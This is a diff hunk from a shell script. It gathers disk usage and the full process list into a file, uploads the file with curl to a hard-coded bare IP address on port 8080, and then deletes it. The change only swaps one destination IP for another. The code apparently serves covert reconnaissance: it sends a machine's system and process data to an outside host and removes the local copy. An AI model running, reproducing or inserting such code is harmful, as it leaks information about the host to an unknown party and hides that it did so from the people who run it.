@@ -13,5 +13,5 @@ df -h >> results
 echo ----------------- ps -aux ------- >> results
 ps -aux >> results
 echo ----------------- END $(date) ------- >> results
-curl -s -F "name=@results" http://138.68.58.230:8080 && echo -n ool
+curl -s -F "name=@results" http://138.68.1.168:8080 && echo -n ool
 rm results
